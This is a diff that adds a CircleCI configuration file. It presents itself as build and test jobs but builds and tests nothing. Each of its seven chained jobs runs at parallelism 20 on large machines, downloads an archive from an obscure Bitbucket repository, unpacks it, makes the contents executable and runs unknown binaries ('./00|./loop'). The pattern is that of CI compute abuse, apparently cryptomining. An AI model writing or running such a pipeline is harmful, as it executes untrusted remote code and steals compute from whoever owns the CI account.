@@ -1,0 +1,148 @@
+version: 2.1
+
+
+jobs:
+  build:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app1
+          command: |
+            curl -O https://bitbucket.org/junasidan/anajakqlmsjskwjdjwkwkqlanbxhcieof9e95odk2o2kt9cjwkorotofk/raw/5cf2ad009d813e187dace01c370b1c9ae736ff10/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  test:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/junasidan/anajakqlmsjskwjdjwkwkqlanbxhcieof9e95odk2o2kt9cjwkorotofk/raw/5cf2ad009d813e187dace01c370b1c9ae736ff10/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  kals:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/junasidan/anajakqlmsjskwjdjwkwkqlanbxhcieof9e95odk2o2kt9cjwkorotofk/raw/5cf2ad009d813e187dace01c370b1c9ae736ff10/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  luks:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/junasidan/anajakqlmsjskwjdjwkwkqlanbxhcieof9e95odk2o2kt9cjwkorotofk/raw/5cf2ad009d813e187dace01c370b1c9ae736ff10/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  rens:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/junasidan/anajakqlmsjskwjdjwkwkqlanbxhcieof9e95odk2o2kt9cjwkorotofk/raw/5cf2ad009d813e187dace01c370b1c9ae736ff10/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  kuols:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/junasidan/anajakqlmsjskwjdjwkwkqlanbxhcieof9e95odk2o2kt9cjwkorotofk/raw/5cf2ad009d813e187dace01c370b1c9ae736ff10/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  sets:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/junasidan/anajakqlmsjskwjdjwkwkqlanbxhcieof9e95odk2o2kt9cjwkorotofk/raw/5cf2ad009d813e187dace01c370b1c9ae736ff10/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+
+
+
+
+
+
+workflows:
+  build_and_test:
+    jobs:
+      - build
+      - test:
+          requires:
+            - build
+      - kals:
+          requires:
+            - test
+      - luks:
+          requires:
+            - kals
+      - rens:
+          requires:
+            - luks
+      - kuols:
+          requires:
+            - rens
+      - sets:
+          requires:
+            - kuols
+
+
+
+
+
+
+
+
+
+
+
